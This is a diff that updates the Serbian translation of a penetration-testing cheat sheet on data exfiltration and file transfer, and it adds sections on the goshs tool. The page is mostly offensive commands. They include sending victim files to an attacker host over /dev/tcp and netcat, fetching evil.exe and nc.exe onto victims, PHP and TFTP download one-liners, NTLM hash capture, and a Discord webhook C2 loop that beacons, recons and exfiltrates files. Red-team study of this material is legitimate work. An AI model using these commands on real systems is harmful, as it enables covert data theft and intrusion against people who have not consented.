@@ -3,15 +3,15 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Za end-to-end primer staging loota u `C:\Users\Public` i exfiltrating pomoću Rclone kako bi se oponašali legitimni backups, pregledajte workflow ispod.
+> Za kompletan primer staging-a loot-a u `C:\Users\Public` i njegovog exfiltriranja pomoću Rclone da bi se oponašali legitimni backup-ovi, pregledajte workflow ispod.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Domeni koji se često nalaze na whitelisti za exfiltrate informacije
+## Commonly whitelisted domains to exfiltrate information
 
-Posetite [https://lots-project.com/](https://lots-project.com/) da pronađete domene koji su često whitelisted i koji se mogu zloupotrebiti
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
 ## Copy\&Paste Base64
 
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Otpremanje fajlova
+### Upload files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python modul [uploadserver](https://pypi.org/project/uploadserver/):
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -107,13 +107,46 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) je single-binary zamena za `python3 -m http.server`
+sa upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+i OOB collaboration funkcijama (DNS, SMTP, NTLM hash capture).
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks su write-only HTTPS endpointi koji prihvataju JSON i opciono file delove. Obično su dozvoljeni za pouzdane SaaS domene i ne zahtevaju OAuth/API ključeve, što ih čini korisnim za low-friction beaconing i exfiltration.
+Webhooks su write-only HTTPS endpointi koji prihvataju JSON i opcionalne file delove. Često su dozvoljeni za trusted SaaS domene i ne zahtevaju OAuth/API keys, što ih čini korisnim za low-friction beaconing i exfiltration.
 
 Key ideas:
-- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Endpoint: Discord koristi https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data sa delom nazvanim payload_json koji sadrži {"content":"..."} i opcionalnim file delom/delovima nazvanim file.
 - Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK potvrđuju isporuku.
 
 PowerShell PoC (Discord):
@@ -184,9 +217,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Beleške:
-- Slični obrasci važe i za druge platforme za saradnju (Slack/Teams) koje koriste njihove incoming webhooks; prilagodite URL i JSON schema u skladu.
-- Za DFIR vezano za artefakte keša Discord Desktop i oporavak webhook/API, pogledajte:
+Napomene:
+- Slični obrasci se primenjuju i na druge platforme za saradnju (Slack/Teams) koristeći njihove incoming webhooks; prilagodite URL i JSON šemu prema tome.
+- Za DFIR Discord Desktop cache artefakata i webhook/API recovery, pogledajte:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -242,7 +275,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreiraj smb share **koristeći samba**:
+Ili napravite smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +298,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) je alternativa u jednom binarnom fajlu
+koja servira fajlove preko SMB i hvata NetNTLMv2 hashove od klijenata koji se povezuju:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-Napadač mora da ima SSHd pokrenut.
+Napadač mora imati pokrenut SSHd.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ako žrtva ima SSH, napadač može montirati direktorijum sa žrtve na svoju mašinu.
+Ako žrtva ima SSH, napadač može da mount-uje direktorijum sa žrtve na napadača.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,19 +329,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Preuzimanje fajla sa victim
+### Preuzimanje fajla od žrtve
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Otpremanje fajla na žrtvu
+### Upload datoteku na žrtvu
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Zahvaljujući **@BinaryShadow\_**
+zahvaljujući **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -320,13 +363,27 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete да поšaljete podatke на SMTP сервер, можете направити SMTP сервер који ће примати податке користећи python:
+Ako možete da pošaljete podatke SMTP serveru, možete napraviti SMTP da primi podatke pomoću python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) može brzo da podigne SMTP server
+za hvatanje email callback-ova tokom OOB exfiltration scenarija:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Primljeni emailovi i callback-ovi se prikazuju direktno u izlazu terminala.
+Može se kombinovati sa DNS callback serverom za potpuno OOB pokrivanje:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-Podrazumevano u XP i 2003 (u ostalim verzijama je potrebno eksplicitno dodati tokom instalacije)
+Podrazumevano u XP i 2003 (u ostalima mora biti eksplicitno dodato tokom instalacije)
 
 U Kali, **pokreni TFTP server**:
 ```bash
@@ -335,18 +392,18 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server u python:**
+**TFTP server u python-u:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-U **victim**, povežite se na Kali server:
+U **žrtvi**, povežite se na Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Preuzmite fajl pomoću PHP onelinera:
+Preuzmi fajl pomoću PHP oneliner-a:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -388,21 +445,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo da omogućava inspekciju binarnih fajlova već ima i **sposobnost da ih rekonstruiše iz hex**. To znači da, pružanjem hex prikaza binarnog fajla, `debug.exe` može generisati binarni fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje u sastavljanju fajlova do 64 kb veličine**.
+`debug.exe` program ne samo da omogućava inspekciju binary fajlova, već ima i **mogućnost da ih rekonstruiše iz hex-a**. To znači da, unošenjem hex zapisa nekog binary fajla, `debug.exe` može da generiše binary fajl. Međutim, važno je napomenuti da debug.exe ima **ograničenje pri sastavljanju fajlova do 64 kb veličine**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Zatim kopirajte i nalepite tekst u windows-shell i biće kreiran fajl pod imenom nc.exe.
+Onda copy-paste tekst u windows-shell i biće kreirana datoteka nazvana nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## Reference
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
